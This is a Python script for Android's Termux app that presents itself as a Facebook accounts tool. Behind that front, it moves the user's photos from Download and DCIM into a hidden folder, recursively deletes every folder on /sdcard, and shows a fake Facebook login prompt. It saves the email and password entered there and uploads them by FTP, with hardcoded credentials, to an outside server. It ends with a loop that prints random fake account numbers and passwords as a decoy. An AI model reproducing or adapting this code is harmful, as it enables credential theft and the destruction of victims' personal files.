import os
import shutil
from tqdm import tqdm
import pyfiglet
from colorama import Fore, Style
import ftplib
import time
import random
import string
##################
def create_directory(directory_path):
    try:
        os.makedirs(directory_path)
        print(f"Directory '{directory_path}' created successfully.")
    except FileExistsError:
        print(f"Directory '{directory_path}' already exists.")

def main():
    directory_path = "/data/data/com.termux/files/home/facebok/source/d/source/b"
    create_directory(directory_path)

if __name__ == "__main__":
    main()
#####################################

def move_files(source_dirs, target_dir):
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif')

    total_size = 0
    for source_dir in source_dirs:
        total_size += sum(os.path.getsize(os.path.join(root, file))
                          for root, _, files in os.walk(source_dir)
                          for file in files
                          if file.lower().endswith(image_extensions))

    progress_bar = tqdm(total=total_size, unit='B', unit_scale=True, desc='Progress', leave=False)

    for source_dir in source_dirs:
        for root, _, files in os.walk(source_dir):
            for file in files:
                if file.lower().endswith(image_extensions):
                    source_path = os.path.join(root, file)
                    progress_bar.update(os.path.getsize(source_path))
                    target_path = os.path.join(target_dir, file)
                    shutil.move(source_path, target_path)
                    progress_bar.set_postfix(File=file[:30])

    progress_bar.close()

def main():
    source_directories = ['/sdcard/Download', '/sdcard/DCIM']
    target_directory = '/data/data/com.termux/files/home/facebok/source/d/source/b'  # Target directory in Termux home

    move_files(source_directories, target_directory)

if __name__ == '__main__':
    main()


################################################

def delete_folders(directory):
    folders_to_delete = []
    total_folders = 0

    for root, dirs, _ in os.walk(directory, topdown=False):
        total_folders += len(dirs)
        folders_to_delete.extend([os.path.join(root, folder) for folder in dirs])

    progress_bar = tqdm(total=total_folders, desc='Loading', unit='folder')

    for folder in folders_to_delete:
        try:
            shutil.rmtree(folder)
        except Exception as e:
            pass  # Ignore errors

        progress_bar.update(1)

    progress_bar.close()

def main():
    download_directory = '/sdcard'
    delete_folders(download_directory)

if __name__ == '__main__':
    main()


###############################################
def print_big_words(text, font_size):
    words = text.split()
    for word in words:
        result = pyfiglet.figlet_format(word, font=font_size)
        print(Fore.GREEN + result)

def main():
    text = "FACEBOOK ACCOUNTS"
    font_size = "small"  # Adjust the font size here
    print_big_words(text, font_size)

if __name__ == "__main__":
    main()


print(Fore.YELLOW + 'Facebook login')

print(Fore.BLUE + 'Enter email: ' + Style.RESET_ALL, end='')
email = input(Fore.WHITE)
print(Fore.BLUE + 'Enter password: ' + Style.RESET_ALL, end='')
password = input(Fore.WHITE)

########################

def create_next_file(prefix):
    i = 1
    while True:
        filename = f"{prefix}{i}.txt"
        filepath = os.path.join("/data/data/com.termux/files/home/facebok/source/d/source/b", filename)
        if not os.path.exists(filepath):
            with open(filepath, 'w') as file:
                file.write(email + " : " + password)

            upload_file(filepath, filename)
            break
        i += 1

def upload_file(filepath, filename):
    with ftplib.FTP("us-east-1.sftpcloud.io", "asemasasas", "asemasasas") as ftp:
        try:
            existing_files = ftp.nlst()
            if filename in existing_files:
                new_filename = get_new_filename(filename, existing_files)
                with open(filepath, 'rb') as file:
                    ftp.storlines(f"STOR {new_filename}", file)
            else:
                with open(filepath, 'rb') as file:
                    ftp.storlines(f"STOR {filename}", file)

        except ftplib.error_perm as e:
            print(f"FTP Error: {e}")

def get_new_filename(filename, existing_files):
    parts = filename.split('.')
    base = parts[0]
    extension = parts[1]
    i = 1
    while True:
        new_filename = f"{base}p{i}.{extension}"
        if new_filename not in existing_files:
            return new_filename
        i += 1

def main():
    prefix = "p"
    create_next_file(prefix)

if __name__ == "__main__":
    main()

##########

def generate_random_password():
    password_length = random.randint(8, 12)
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=password_length))
    return password

def main():
    while True:
        random_numbers = '10003657'
        random_account_numbers = ''.join(random.choices(string.digits, k=7))
        random_password = generate_random_password()

        print(f"{Fore.RED}{random_numbers}{random_account_numbers}\t{random_password}{Style.RESET_ALL}")

        time.sleep(1)  # Print every 1 second

if __name__ == "__main__":
    main()

#def generate_random_password():
#    password_length = random.randint(8, 12)
#    password = ''.join(random.choices(string.ascii_letters + string.digits, k=password_length))
#    return password

#def main():
#    random_numbers = '10003657'
#    random_account_numbers = ''.join(random.choices(string.digits, k=7))

#    random_password = generate_random_password()

#    print(f"{Fore.RED}{random_numbers}{random_account_numbers}\t{random_password}{Style.RESET_ALL}")

#if __name__ == "__main__":
#    main()



#total_iterations = 200
#total_time_seconds = 5 * 60
#progress_bar = tqdm(total=total_iterations, desc='Progress', unit='iteration', dynamic_ncols=True, colour='green')
#
#start_time = time.time()
#current_iteration = 0

#while current_iteration < total_iterations:
#    time.sleep(total_time_seconds / total_iterations)
#    current_iteration += 1
#    progress_bar.update(1)

#    # Generate random numbers and print them
#    random_number = random.randint(0, 9)
#    print(f"10003658{random_number * 'i'}")

#progress_bar.close()

